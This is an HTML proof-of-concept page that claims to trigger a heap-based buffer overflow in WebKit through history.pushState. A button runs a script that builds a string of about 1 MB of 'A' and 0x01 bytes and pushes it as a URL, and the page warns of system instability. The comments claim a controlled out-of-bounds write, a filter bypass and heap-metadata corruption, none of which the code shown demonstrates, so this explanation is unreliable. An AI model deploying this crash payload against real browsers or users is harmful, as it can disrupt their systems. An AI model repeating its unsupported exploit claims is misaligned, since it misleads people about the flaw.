<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>WebKit Heap Overflow</title>
</head>
<body>

<div class="container">
    <h2>Vulnerability: Heap-Based Buffer Overflow in history.pushState</h2>
    <p><strong>Technical Description:</strong> This Proof of Concept demonstrates an Out-Of-Bounds (OOB) Write primitive in the WebKit Heap.</p>
    <p>By supplying a payload exceeding the internal buffer allocation logic, we can overwrite adjacent heap chunks with controlled data (0x01 bytes).</p>
    
    <ul>
        <li><strong>Allocation Target:</strong> ~709KB (Base String)</li>
        <li><strong>Overflow Size:</strong> ~340KB (Controlled 0x01 bytes)</li>
        <li><strong>Trigger:</strong> Invalid write at memory boundary (0x41414141)</li>
    </ul>

    <button class="btn" onclick="executePoC()">Trigger Memory Corruption</button>
    
    <div id="log"></div>
</div>

<script>
    function log(msg) {
        const el = document.getElementById('log');
        el.innerHTML += `<div>> ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    function executePoC() {
        log("Initializing payload generation...");

        setTimeout(() => {
            try {
                // STEP 1: Fill the legitimate buffer
                // This fills the allocated chunk up to the vulnerable boundary (709,522 bytes).
                const BUFFER_LIMIT = 709522;
                const baseBuffer = "A".repeat(BUFFER_LIMIT);
                log(`Base buffer created: ${BUFFER_LIMIT} bytes.`);

                // STEP 2: The Controlled Overflow (The "Write Primitive")
                // We use 0x01 bytes because they bypass the character filter check.
                // This proves we can write ~340KB beyond the intended buffer without crashing immediately.
                // This targets the 1MB Heap Bucket size class.
                const OOB_SIZE = 340000; 
                const controlledOverflow = "\x01".repeat(OOB_SIZE);
                log(`Generating OOB Payload: ${OOB_SIZE} bytes of controlled data (0x01)...`);

                // STEP 3: Corruption Trigger
                // Writing 0x41 ('A') at the very end forces the allocator to process the 
                // corrupted heap metadata created by Step 2, resulting in a system panic.
                const corruptionTrigger = "AAAA"; 

                // Assemble the full payload
                const finalPayload = "/" + baseBuffer + controlledOverflow + corruptionTrigger;
                
                log(`Injecting total payload (${finalPayload.length} bytes) via history.pushState...`);
                log("Executing... Expect system instability due to heap corruption.");

                // EXECUTE
                history.pushState({}, "poc", finalPayload);
                
            } catch (e) {
                log(`Error: ${e.message}`);
            }
        }, 500);
    }
</script>

</body>
</html>
